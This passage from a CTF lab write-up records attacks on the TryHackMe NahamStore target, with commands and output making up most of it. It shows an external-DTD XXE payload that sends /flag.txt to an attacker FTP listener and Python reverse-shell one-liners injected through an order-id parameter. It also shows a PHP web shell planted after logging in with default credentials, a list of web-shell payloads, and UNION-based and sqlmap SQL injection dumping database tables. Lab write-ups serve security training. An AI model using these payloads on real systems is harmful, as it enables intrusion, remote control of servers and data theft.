uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:102:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:103:104:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:104:105:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin

we did it now get the flag

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ cat xxe.dtd
<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.8.19.103:2121/%d;'>">

upload it again

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ ./xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000
2023/03/22 20:24:44 [*] Storing session into the file: files.log
2023/03/22 20:24:44 [*] Starting Web Server on 8000 [public]
[*] No certificate files found in directory. Generating new...
[*] UNO Listening...
[*] Certificate files generated
2023/03/22 20:24:44 [*] GO XXE FTP Server - Port:  2121
2023/03/22 20:26:06 [*] Connection Accepted from [10.10.202.146:33530]
2023/03/22 20:26:08 [x] Connection Closed
2023/03/22 20:26:08 [*] Closing FTP Connection
2023/03/22 20:26:08 [*] Connection Accepted from [10.10.202.146:33532]
2023/03/22 20:26:09 [x] Connection Closed
2023/03/22 20:26:09 [*] Closing FTP Connection

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.202.146 - - [22/Mar/2023 20:26:06] "GET /xxe.dtd HTTP/1.0" 200

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ cat files.log 
USER:  anonymous
PASS:  anonymous
//e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=
SIZE
MDTM
USER:  anonymous
PASS:  anonymous

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ echo "e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=" | base64 -d 
{d6b22cb3e37bef32d800105b11107d8f}


```

![[Pasted image 20230322192737.png]]

XXE Flag  

*{9f18bd8b9acaada53c4c643744401ea8}*

Blind XXE Flag

*{d6b22cb3e37bef32d800105b11107d8f}*


### RCE

Find ways to run commands on the webserver. You'll find the flags in /flag.txt  

Answer the questions below

```
POST /pdf-generator HTTP/1.1
what=order&id=4;whoami

Cannot find order: 4;whoami

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ w'h'o'am'i
witty

encode url

what=order&id=4%3bw'h'o'am'i

not work

&& , ; , $() , ||, ` (maybe Blind RCE)

what=order&id=4$(whoami)

Cannot find order: 4www-data

I did it, let's get flag then a revshell

what=order&id=4$(ls)

Cannot find order: 4cssindex.phpjsrobots.txtuploads

what=order&id=4$(find / -type f -name flag.txt 2>/dev/null)

Cannot find order: 4/lfi/flag.txt/flag.txt

now getting a revshell

what=order&id=4$(which python3)

Cannot find order: 4/usr/bin/python3

what=order&id=4$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')

another way

what=order&id=4`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`


┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ rlwrap nc -lvnp 1338                                     
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.250.217] 33706
www-data@2431fe29a4b0:~/html/public$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:104:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:105:106::/nonexistent:/usr/sbin/nologin

www-data@2431fe29a4b0:~/html/public$ cat /lfi/flag.txt
cat /lfi/flag.txt
www-data@2431fe29a4b0:~/html/public$ cat /flag.txt
cat /flag.txt
{93125e2a845a38c3e1531f72c250e676}
www-data@2431fe29a4b0:~/html/public$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.3	2431fe29a4b0
127.0.0.1       nahamstore.thm
127.0.0.1       www.nahamstore.thm
172.17.0.1      stock.nahamstore.thm
172.17.0.1      marketing.nahamstore.thm
172.17.0.1      shop.nahamstore.thm
172.17.0.1      nahamstore-2020.nahamstore.thm
172.17.0.1      nahamstore-2020-dev.nahamstore.thm
10.131.104.72   internal-api.nahamstore.thm

like we found doing permutations using altdns and other tools

Let's look for another RCE

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ rustscan -a 10.10.250.217 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.250.217:22
Open 10.10.250.217:80
Open 10.10.250.217:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 14:32 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
Initiating Connect Scan at 14:32
Scanning something.nahamstore.thm (10.10.250.217) [3 ports]
Discovered open port 22/tcp on 10.10.250.217
Discovered open port 80/tcp on 10.10.250.217
Discovered open port 8000/tcp on 10.10.250.217
Completed Connect Scan at 14:32, 0.19s elapsed (3 total ports)
Initiating Service scan at 14:32
Scanning 3 services on something.nahamstore.thm (10.10.250.217)
Completed Service scan at 14:32, 11.76s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.250.217.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 6.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.79s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
Nmap scan report for something.nahamstore.thm (10.10.250.217)
Host is up, received user-set (0.19s latency).
Scanned at 2023-03-23 14:32:02 EDT for 19s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 846e52cadb9edf0aaeb5703d07d69178 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk0dfNL0GNTinnjUpwRlY3LsS7cLO2jAp3QRvFXOB+s+bPPk+m4duQ95Z6qagERl/ovdPsSJTdiPXy2Qpf+aZI4ba2DvFWfvFzfh9Jrx7rvzrOj0i0kUUwot9WmxhuoDfvTT3S6LmuFw7SAXVTADLnQIJ4k8URm5wQjpj86u7IdCEsIc126krLk2Nb7A3qoWaI+KJw0UHOR6/dhjD72Xl0ttvsEHq8LPfdEhPQQyefozVtOJ50I1Tc3cNVsz/wLnlLTaVui2oOXd/P9/4hIDiIeOI0bSgvrTToyjjTKH8CDet8cmzQDqpII6JCvmYhpqcT5nR+pf0QmytlUJqXaC6T
|   256 1a1ddbca998a64b18b10dfa939d55cd3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC/YPu9Zsy/Gmgz+aLeoHKA1L5FO8MqiyEaalrkDetgQr/XoRMvsIeNkArvIPMDUL2otZ3F57VBMKfgydtBcOIA=
|   256 f63616b7668e7b350907cb90c9846338 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAicOmkn8r1FCga8kLxn9QC7NdeGg0bttFiaaj11qec
80/tcp   open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: NahamStore - Setup Your Hosts File
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 4208E33E7C9F713ECD7816EDE3B3F454
8000/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 seconds

| http-robots.txt: 1 disallowed entry 
|_/admin let's see it :)

http://10.10.250.217:8000/admin/login (brute force or default creds)

admin' or 1=1 # (not work) just do it with admin:admin (works)

we can edit let's first test 

<?php echo('test')?>

payloads : 

'<?php system($_GET['x']); ?>'
'<?php system($_REQUEST['x']); ?>'
'<?php echo system($_REQUEST['x']); ?>'
'<?php echo shell_exec($_GET['x']); ?>'

editing
<?php system($_GET['x']); ?>

http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c?x=whoami

www-data it works now uploading php ivan sincek (it is really good bypass waf (Web application firewall if there is -- Holo)

https://www.revshells.com/

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.250.217] 54264
SOCKET: Shell has connected! PID: 2603
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@af11c847d4c7:~/html/marketing/public$ find / -type f -name flag.txt 2>/dev/null
<g/public$ find / -type f -name flag.txt 2>/dev/null
/flag.txt
www-data@af11c847d4c7:~/html/marketing/public$ ls
ls
index.php
www-data@af11c847d4c7:~/html/marketing/public$ cd /
cd /
www-data@af11c847d4c7:/$ ls
ls
bin   etc	lib    libx32  opt   run   startup.sh  usr
boot  flag.txt	lib32  media   proc  sbin  sys	       var
dev   home	lib64  mnt     root  srv   tmp
www-data@af11c847d4c7:/$ cat flag.txt
cat flag.txt
{b42d2f1ff39874d56132537be62cf9e3}

www-data@af11c847d4c7:~/html/marketing/public$ ls -lah /
ls -lah /
total 72K
drwxr-xr-x   1 root root 4.0K May  6  2021 .
drwxr-xr-x   1 root root 4.0K May  6  2021 ..
-rwxr-xr-x   1 root root    0 May  6  2021 .dockerenv
lrwxrwxrwx   1 root root    7 Jan 19  2021 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Apr 15  2020 boot
drwxr-xr-x   5 root root  360 Mar 23 18:00 dev
drwxr-xr-x   1 root root 4.0K May  6  2021 etc
-rw-r--r--   1 root root   35 Feb 17  2021 flag.txt
drwxr-xr-x   2 root root 4.0K Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Jan 19  2021 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jan 19  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jan 19  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jan 19  2021 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4.0K Jan 19  2021 media
drwxr-xr-x   2 root root 4.0K Jan 19  2021 mnt
drwxr-xr-x   2 root root 4.0K Jan 19  2021 opt
dr-xr-xr-x 187 root root    0 Mar 23 18:00 proc
drwx------   2 root root 4.0K Jan 19  2021 root
drwxr-xr-x   1 root root 4.0K May  6  2021 run
lrwxrwxrwx   1 root root    8 Jan 19  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Jan 19  2021 srv
-rwxr-xr-x   1 root root   88 Feb 17  2021 startup.sh
dr-xr-xr-x  13 root root    0 Mar 23 18:00 sys
drwxrwxrwt   1 root root 4.0K Mar 23 18:00 tmp
drwxr-xr-x   1 root root 4.0K Jan 19  2021 usr
drwxr-xr-x   1 root root 4.0K Feb 17  2021 var

Like I thought we were in a docker container

```


First RCE flag  

*{b42d2f1ff39874d56132537be62cf9e3}*

Second RCE flag

*{93125e2a845a38c3e1531f72c250e676}*


### SQL Injection

There are 2 SQL Injection vulnerabilities somewhere in the NahamStore domain. One will return data to the page and the other is blind. The flags can be found in the database tables called sqli_one & sql_two in the column name flag.  

Answer the questions below

```

https://github.com/eslam3kl/SQLiDetector

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ echo "http://testphp.vulnweb.com/artists.php?artist=1" > test
                                                                                                                   
┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ python3 sqlidetector.py -f test -w 10                        
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
|S|Q|L|i| |D|e|t|e|c|t|o|r|
| Coded By: Eslam Akl @eslam3kll & Khaled Nassar @knassar702
| Version: 1.0.0
| Blog: eslam3kl.medium.com
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
>>>  http://testphp.vulnweb.com/artists.php?artist='123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=`)123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=')123"123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=''123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist='))123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=[]123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=`123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist="))123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=`))123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=")123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist='"123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=""123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist=\123  Warning.*?\Wmysqli?_
>>>  http://testphp.vulnweb.com/artists.php?artist="'123  Warning.*?\Wmysqli?_
 Scanning 14/14 | 100%  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

doing manually

GET /search?q=test' HTTP/1.1
Search Results For "test'"

payloads: test') , ", "; also can do it before the parameter

GET /search?q'=a' HTTP/1.1

GET /search?q')=a") HTTP/1.1

GET /search?"q=a") HTTP/1.1 maybe blind sqli

GET /search?q=test') sleep(5) HTTP/1.1

GET /search?q[]=test') HTTP/1.1
Search Results For "Array"

here there a nice wordlist

https://raw.githubusercontent.com/orwagodfather/WordList/main/SQL.txt

also can test in cookies or user-agent

GET /product?id=2' HTTP/1.1

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1

GET /product?id=1337+union+select+1,2,3,4,5+--+- HTTP/1.1

<strong>2</strong></div>
<div style="margin-bottom:20px">$0.03</div>
<div style="margin-bottom:20px">4

so 2 and 4 to show

GET /product?id=1337+union+select+1,version(),3,database(),5+--+- HTTP/1.1

<strong>8.0.23-0ubuntu0.20.04.1</strong></div>
<div style="margin-bottom:20px">$0.03</div>
<div style="margin-bottom:20px">nahamstore

GET /product?id=1337+union+select+1,2,3,group_concat(table_name),null+from+information_schema.tables+--+- HTTP/1.1

<div style="margin-bottom:20px">ADMINISTRABLE_ROLE_AUTHORIZATIONS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMNS_EXTENSIONS,COLUMN_PRIVILEGES,COLUMN_STATISTICS,ENABLED_ROLES,ENGINES,EVENTS,FILES,INNODB_BUFFER_PAGE,INNODB_BUFFER_PAGE_LRU,INNODB_BUFFER_POOL_STATS,INNODB_CACHED_INDEXES,INNODB_CMP,INNODB_CMPMEM,INNODB_CMPMEM_RESET,INNODB_CMP_PER_INDEX,INNODB_CMP_PER_INDEX_RESET,INNODB_CMP_RESET,INNODB_COLUMNS,INNODB_DATAFILES,INNODB_FIELDS,INNODB_FOREIGN,INNODB_FOREIGN_COLS,INNODB_FT_BEING_DELETED,INNODB_FT_CONFIG,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_DELETED,INNODB_FT_INDEX_CACHE,INNODB_FT_INDEX_TABLE,INNODB_INDEXES,INNODB_METRICS,INNODB_SESSION_TEMP_TABLESPACES,INNODB_TABLES,INNODB_TABLESPACES,INNODB_TABLESPACES_BRIEF,INNODB_TABLESTATS,INNODB_TEMP_TABLE_INFO,INNODB_TRX,INNODB_VIRTUAL,KEYWORDS,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,RESOURCE_GROUPS,ROLE_COLUMN_GRANTS,ROLE_ROUTINE_GRANTS,ROLE_TABLE_GRANTS,ROUTI</div>

so need to specify the database name

GET /product?id=1337+union+select+1,2,3,group_concat(table_name),null+from+information_schema.tables+where+table_schema='nahamstore'+--+- HTTP/1.1

<div style="margin-bottom:20px">product,sqli_one</div>

GET /product?id=1337+union+select+1,2,3,group_concat(column_name),null+from+information_schema.columns+where+table_name='sqli_one'+--+- HTTP/1.1

<div style="margin-bottom:20px">id,flag</div>

GET /product?id=1337+union+select+1,2,3,group_concat(id,0x3a,flag),null+from+sqli_one+--+- HTTP/1.1

<div style="margin-bottom:20px">1:{d890234e20be48ff96a2f9caab0de55c}</div>

Now let's do it with sqlmap in order to do that save request

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ cat req_1 
GET /product?id=1 HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://nahamstore.thm/
Cookie: token=f7dc5a32...; session=a2c6214754a5...
Upgrade-Insecure-Requests: 1

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_1 --batch   
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:12:57 /2023-03-24/

[00:12:57] [INFO] parsing HTTP request from 'req_1'
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:12:58] [INFO] testing connection to the target URL
[00:12:58] [INFO] checking if the target is protected by some kind of WAF/IPS
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[00:12:59] [INFO] testing if the target URL content is stable
[00:12:59] [INFO] target URL content is stable
[00:12:59] [INFO] testing if GET parameter 'id' is dynamic
[00:12:59] [WARNING] GET parameter 'id' does not appear to be dynamic
[00:12:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[00:13:00] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[00:13:00] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[00:13:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:13:00] [WARNING] reflective value(s) found and filtering out
[00:13:01] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[00:13:01] [INFO] testing 'Generic inline queries'
[00:13:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[00:13:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[00:13:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[00:13:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[00:13:02] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[00:13:03] [INFO] GET parameter 'id' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[00:13:03] [INFO] testing 'MySQL inline queries'
[00:13:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[00:13:03] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
[00:13:17] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[00:13:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[00:13:28] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[00:13:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:13:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:13:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:13:30] [INFO] target URL appears to have 5 columns in query
[00:13:32] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3571=3571

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
---
[00:13:32] [INFO] the back-end DBMS is MySQL
[00:13:33] [WARNING] potential permission problems detected ('command denied')
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.6
[00:13:34] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 15 times
[00:13:34] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:13:34 /2023-03-24/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_1 --batch --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:14:24 /2023-03-24/

[00:14:24] [INFO] parsing HTTP request from 'req_1'
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:14:25] [INFO] resuming back-end DBMS 'mysql' 
[00:14:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3571=3571

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
---
[00:14:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.6
[00:14:25] [INFO] fetching database names
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
available databases [2]:
[*] information_schema
[*] nahamstore

[00:14:26] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

